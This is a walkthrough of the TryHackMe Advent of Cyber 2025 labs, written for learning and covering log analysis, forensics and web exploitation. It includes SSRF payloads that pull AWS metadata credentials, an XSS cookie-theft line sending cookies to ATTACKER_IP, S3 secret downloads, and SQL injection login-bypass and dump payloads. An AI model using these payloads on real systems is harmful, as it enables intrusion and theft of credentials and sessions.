# 🛠️ Walkthrough: TryHackMe Advent of Cyber 2025

**Platform:** TryHackMe  
**Badge:** THM-L6596XPHA4  
**Duration:** December 2025 (25 Days)  
**Category:** All — Web, Forensics, OSINT, Scripting, Network, Malware, AI  
**Status:** ✅ Completed

---

## 📝 Overview

The TryHackMe Advent of Cyber 2025 was a month-long challenge featuring 25 daily cybersecurity tasks covering a wide range of categories. Each day introduced a new topic with hands-on labs inside TryHackMe's isolated VPN environment.

This walkthrough documents my approach, tools used, and key learnings from each day.

---

## 🗓️ Day-by-Day Breakdown

### Day 1 — OPSEC: Tracing the Source
**Category:** OSINT / Digital Footprinting  
**Task:** Trace the origin of a malicious email using OSINT techniques.

**What I Did:**
```
1. Analyzed email headers for originating IP
2. Used WHOIS, IP geolocation, Shodan
3. Cross-referenced with threat intel feeds
4. Found: Malicious actor infrastructure in Eastern Europe
```
**Tools:** `whois`, `shodan.io`, `mxtoolbox.com`, `ipinfo.io`  
**Key Learning:** Email headers contain a wealth of forensic data. Always inspect `Received:` chains.

---

### Day 2 — Log Analysis: Follow the Trail
**Category:** Blue Team / Log Analysis  
**Task:** Investigate Apache access logs to detect a web scan and identify the attacker's IP.

**What I Did:**
```bash
# Count requests by IP
awk '{print $1}' access.log | sort | uniq -c | sort -rn | head

# Find 404 patterns (scanner behavior)
grep " 404 " access.log | awk '{print $1}' | sort | uniq -c | sort -rn

# Find suspicious User-Agent
grep -i "sqlmap\|nikto\|nmap" access.log
```
**Key Learning:** Automated scanners leave obvious patterns — high 404 rates, scanner User-Agents, sequential URL patterns.

---

### Day 3 — Malware Analysis: Dissecting the Threat
**Category:** Malware Analysis (Static)  
**Task:** Analyze a suspicious Windows executable using static analysis tools.

**What I Did:**
```bash
# Check file type
file malware.exe

# Inspect strings
strings malware.exe | grep -E "(http|https|ftp|cmd|powershell|temp)"

# Check imports
objdump -d malware.exe | grep "call"

# Check with VirusTotal (hash)
sha256sum malware.exe
# → Searched hash on VirusTotal
```
**Key Learning:** Malware often contains hardcoded C2 URLs and common API calls like `CreateProcess`, `VirtualAlloc`, `WriteProcessMemory`.

---

### Day 4 — SSRF: Attack the Internal
**Category:** Web Exploitation  
**Task:** Exploit Server-Side Request Forgery to read internal AWS metadata.

**What I Did:**
```
Vulnerable parameter: ?url=http://TARGET_IP/page

Payload:
?url=http://169.254.169.254/latest/meta-data/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
→ Retrieved: AWS temporary credentials
```
**Key Learning:** Cloud metadata endpoints (169.254.169.254) are always a target when SSRF is found.

---

### Day 5 — XSS: Injecting the Payload
**Category:** Web Exploitation  
**Task:** Find and exploit reflected XSS, then escalate to session hijacking.

**Payloads Tested:**
```javascript
// Basic reflection test
<script>alert(1)</script>

// Cookie theft (sanitized)
<script>new Image().src="http://ATTACKER_IP/?" + document.cookie</script>

// Encoded bypass (when basic blocked)
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```
**Key Learning:** Always test multiple XSS contexts — HTML body, attributes, JavaScript strings, URL parameters.

---

### Day 6 — Macro Magic: Office Exploitation
**Category:** Phishing / Malware  
**Task:** Analyze a malicious Office document containing a VBA macro.

**What I Did:**
```bash
# Extract macros from .docm
olevba malicious.docm

# Found macro:
# Auto-runs on document open
# Downloads payload from C2
# Executes via PowerShell
```
**Key Learning:** `olevba` and `oletools` are essential for Office malware analysis. Look for `AutoOpen`, `Document_Open` macros.

---

### Day 7 — AWS Misconfig: Cloud Bucket Hunt
**Category:** Cloud Security / OSINT  
**Task:** Find exposed S3 buckets and enumerate contents.

**What I Did:**
```bash
# Check common bucket naming patterns
aws s3 ls s3://aoc2025-target --no-sign-request

# Download files from public bucket
aws s3 cp s3://aoc2025-target/secrets.txt . --no-sign-request
```
**Key Learning:** S3 buckets with predictable names + public ACLs = data breach. Always enable Block Public Access settings.

---

### Day 8 — Phishing Analysis: Dissecting the Lure
**Category:** Blue Team / Email Security  
**Task:** Analyze a phishing email and identify all IOCs.

**IOC Checklist Applied:**
```
□ Sender domain (typosquatting check)
□ Embedded links (hover before click)
□ Attachment analysis (olevba, file type check)
□ Email header analysis (MX, SPF, DKIM)
□ C2 domains (VirusTotal, URLScan)
□ Impersonated brand
```

---

### Day 9 — Digital Forensics: Memory Dump
**Category:** Digital Forensics  
**Task:** Analyze a Windows memory dump to find evidence of compromise.

```bash
# Identify profile
volatility3 -f memory.dmp windows.info

# List processes
volatility3 -f memory.dmp windows.pslist

# Find suspicious network connections
volatility3 -f memory.dmp windows.netstat

# Dump suspicious process memory
volatility3 -f memory.dmp windows.dumpfiles --pid [SUSPICIOUS_PID]

# Scan for malware signatures
volatility3 -f memory.dmp windows.malfind
```

---

### Day 10 — SQL Injection: Dumping the Database
**Category:** Web Exploitation  
**Task:** Exploit a login form with SQL injection and dump user credentials.

```sql
-- Login bypass
' OR 1=1 -- -

-- Union-based enumeration
' UNION SELECT NULL,NULL,NULL -- -
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables -- -
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users' -- -
' UNION SELECT username,password,NULL FROM users -- -
```

---

### Days 11-25 — Additional Categories

| Day | Topic | Category |
|-----|-------|----------|
| 11 | Wi-Fi Attacks (WPA2 handshake) | Network |
| 12 | Active Directory Basics | Windows Security |
| 13 | Kerberoasting | AD Attacks |
| 14 | Command & Control (C2) | Red Team |
| 15 | API Security | Web |
| 16 | JWT Attacks | Web |
| 17 | Container Security | DevSecOps |
| 18 | CI/CD Pipeline Security | DevSecOps |
| 19 | AI Prompt Injection | AI Security |
| 20 | Deepfake Detection | AI Security |
| 21 | Purple Team Exercise | Both |
| 22 | Threat Hunting | Blue Team |
| 23 | SIEM Analysis | Blue Team |
| 24 | Incident Response | Blue Team |
| 25 | **Grand Finale: Full Attack Chain** | Red Team |

---

## 🏅 Achievement

**Badge Earned:** THM-L6596XPHA4 — Advent of Cyber 2025 Completion

---

## 🧠 Top Takeaways

1. **Log analysis** is the backbone of blue team work — master `grep`, `awk`, `cut`
2. **SSRF** → cloud metadata is always the first target
3. **Memory forensics** with Volatility3 reveals what static analysis misses
4. **AI security** is the new frontier — prompt injection and model manipulation are real threats
5. **Purple teaming** bridges the gap between attackers and defenders

---

*All challenges completed in TryHackMe's isolated lab environment. No live systems were targeted.*
